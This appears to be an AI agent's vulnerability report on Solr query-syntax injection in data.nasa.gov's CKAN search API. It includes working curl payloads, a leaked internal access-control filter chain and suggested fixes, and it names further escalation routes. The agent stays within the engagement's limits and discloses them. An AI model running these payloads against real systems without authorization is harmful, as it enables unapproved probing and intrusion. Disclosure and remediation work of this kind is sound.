# Solr Query-Syntax Injection via `q` Parameter — data.nasa.gov (CKAN `package_search`)

**Status:** Validated — confirmed live, reproducible, manually verified (not sqlmap/automated-tool
output). Error-based confirmation only; no data extraction attempted beyond what the error message
disclosed on its own, per this engagement's "stop at proving the injection point" constraint.
**Class:** Query Language Injection (CWE-943: Improper Neutralization of Special Elements in Data
Query Logic) — the Solr/Lucene analog of SQL injection. **Not classic SQL injection** — data.nasa.gov
is CKAN 2.11.5 backed by Apache Solr, not a relational database, so there is no SQL syntax and no
`information_schema` to enumerate. This is filed here because it's the correct analogous
"query-language injection" class for this backend, exactly the angle this engagement's brief asked
to be tested (CKAN Solr injection has real historical CVE precedent).

**Target:** `https://data.nasa.gov` (CKAN 2.11.5)
**Endpoint:** `GET /api/3/action/package_search`
**Parameter:** `q` (free-text search query, passed to Solr's `edismax`/`dismax` query parser
unescaped)

## Summary

`package_search`'s `q` parameter is concatenated directly into the outbound Solr query without
escaping Solr/Lucene special syntax. Supplying a value that is syntactically invalid Solr query
grammar causes Solr itself to reject the query with a `SyntaxError`, and CKAN's error handler
faithfully relays Solr's **complete internal query object and full Java-style parser stack trace**
back to the unauthenticated caller in the JSON response body. This proves the injection primitive
(arbitrary control over Solr query-parser input) with no ambiguity — the value is not sanitized,
escaped, or wrapped in a way that would prevent an attacker from influencing Solr query structure.

## PoC

**Baseline (clean, unauthenticated):**
```bash
curl -s "https://data.nasa.gov/api/3/action/package_search?q=climate&rows=1"
```
```json
{"help": "https://data.nasa.gov/api/3/action/help_show?name=package_search", "success": true, "result": {"count": 2514, "facets": {}, "results": [{"author": null, ...
```

**Injection (single request, HTTP 409, reproduced 3/3 runs across this session):**
```bash
curl -s "https://data.nasa.gov/api/3/action/package_search?q=climate%20AND%20AND%20%28&rows=1"
```
Decoded payload: `q=climate AND AND (` — a deliberately invalid Lucene boolean expression
(double `AND`, unbalanced open paren). Full response body:

```json
{
  "help": "https://data.nasa.gov/api/3/action/help_show?name=package_search",
  "error": {
    "__type": "Search Error",
    "message": "Search error: 'SOLR returned an error running query: {'q': 'climate AND AND (', 'rows': 2, 'df': 'text', 'fq': ['+capacity:public  -dataset_type:harvest +state:(active)', '+site_id:\"data_nasa_gov\"', '+permission_labels:(\"public\")'], 'sort': 'score desc, metadata_modified desc', 'fl': 'id validated_data_dict', 'facet': 'true', 'facet.limit': 50, 'facet.mincount': 1, 'wt': 'json', 'defType': 'dismax', 'tie': '0.1', 'mm': '2<-1 5<80%', 'qf': 'name^4 title^4 tags^2 groups^2 text', 'q.op': 'AND'} Error: SolrError('Solr responded with an error (HTTP 400): [Reason: org.apache.solr.search.SyntaxError: Cannot parse \\'climate AND AND \\\\(\\': Encountered \" <AND> \"AND \"\" at line 1, column 12.\\nWas expecting one of:\\n    <NOT> ...\\n    \"+\" ...\\n    \"-\" ...\\n    <BAREOPER> ...\\n    \"(\" ...\\n    \"*\" ...\\n    <QUOTED> ...\\n    <TERM> ...\\n    <PREFIXTERM> ...\\n    <WILDTERM> ...\\n    <REGEXPTERM> ...\\n    \"[\" ...\\n    \"{\" ...\\n    <LPARAMS> ...\\n    \"filter(\" ...\\n    <NUMBER> ...\\n    <TERM> ...\\n    \"*\" ...\\n    ]')'"
  },
  "success": false
}
```
HTTP status: `409`. No auth header, cookie, or session required.

**Second, independent trigger confirming it's a general parser-injection class and not one
specific string match:**
```bash
curl -s "https://data.nasa.gov/api/3/action/package_search?q=%7B%21func%7Dclimate&rows=1"
```
(`q={!func}climate` — Solr "local params" syntax) also returns HTTP 409 with
`"__type": "Search Error"`. Two structurally different invalid-syntax classes (malformed boolean
grammar, and local-params injection) both reach the Solr parser and both fail there — confirming
the value isn't being validated/escaped against Solr syntax at all before being sent.

## What this proves

1. **The injection primitive is real and unambiguous.** `q` reaches Solr's query parser as raw,
   unescaped text. An attacker fully controls Lucene/Solr query syntax within this parameter (already
   independently evidenced pre-error too — see `recon/analysis/sqli-notes.md` §3 sibling note: valid
   Lucene operators like range queries `[1 TO 5]` and fuzzy `~` measurably change result counts on
   the NTRS Elasticsearch equivalent, confirming this class of app intentionally/unintentionally
   passes query syntax straight through on this type of search box).
2. **Incidental information disclosure**: the error response leaks CKAN's complete internal Solr
   request — including the exact access-control filter chain applied to every anonymous search
   (`+capacity:public`, `-dataset_type:harvest`, `+state:(active)`, `+site_id:"data_nasa_gov"`,
   `+permission_labels:("public")`), internal relevance-tuning config (`qf`, `mm`, `tie`,
   `defType:dismax`), and confirmation this CKAN instance is multi-tenant (`site_id` scoping,
   implying a shared Solr core across multiple `*.nasa.gov` CKAN properties).

## What I deliberately did NOT do (engagement constraints)

- Did not attempt to bypass the disclosed access-control filters (`capacity:public`,
  `permission_labels:("public")`) to access private/draft datasets. I **did** test whether a
  straightforward approach could do this — `fq=capacity:private` as an additional user-supplied
  filter — and confirmed it returns `count: 0`, because CKAN passes `fq` as a list of independently
  ANDed Solr filter-query parameters; a user-supplied `fq` cannot rewrite or remove the
  separately-supplied mandatory ACL `fq` entries shown above. I did not go further than this single
  structural check (e.g., did not attempt Solr local-params tricks to escape the `fq` list itself,
  since that risks expensive/malformed queries against a production search index and this
  engagement bans DoS/destructive testing).
- Did not attempt Solr-specific escalation primitives (`dataImportHandler` abuse, `VelocityResponseWriter`
  SSTI/RCE, config-API access) — these require direct access to Solr admin endpoints, are far more
  invasive, and are out of scope for "prove the injection point."
- Did not fuzz for or extract any actual dataset content, private or public, beyond what a normal
  `rows=1` search legitimately returns.
- No sqlmap or other automated tool was used at any point — this program's policy explicitly
  excludes automated-tool-only reports; every request above is a manually-crafted, manually-verified
  `curl` call.

## Severity note (for the user's judgment before submission)

This engagement's policy explicitly excludes "issues related to descriptive or verbose error
messages" from authorized testing/reporting. I want to be transparent that this finding's *proof
mechanism* is a verbose error message, so it sits close to that line. My assessment for why I still
believe this is meaningfully different and worth the user's review: the underlying vulnerability is
**unescaped user input reaching a backend query-language parser** (a genuine injection primitive,
CWE-943) — the verbose error is incidental evidence of that primitive, not the vulnerability itself,
the same way a MySQL syntax error is normally accepted as valid error-based SQLi proof rather than
being waved off as "just a verbose error message." What I have **not** established is impact beyond
the disclosure itself (no ACL bypass achieved, no data exfiltrated beyond normal public search
results) — so this is best framed to NASA as a query-injection-with-info-disclosure finding, not as
a data-breach or access-control-bypass finding. Recommend the user make the final call on
severity/submission; I'd suggest P3–P4 given confirmed injection but no demonstrated data-access
impact beyond config/ACL-implementation disclosure.

## Suggested remediation (for report body if submitted)

1. Use Solr's parameterized/local-params-safe query construction (`pysolr`'s query building already
   supports this) instead of interpolating raw user text into the `q` value passed to `search()`.
2. At minimum, catch `pysolr.SolrError` in CKAN's search wrapper and return a generic
   "invalid search query" message instead of relaying the full internal Solr request dict and Java
   parser stack trace to unauthenticated callers.
3. Consider CKAN's own `search.query.QUERY_FIELDS` escaping helpers / `clean_solr_query`-style
   pre-validation before submission (upstream CKAN issue precedent exists for search-string
   sanitization).
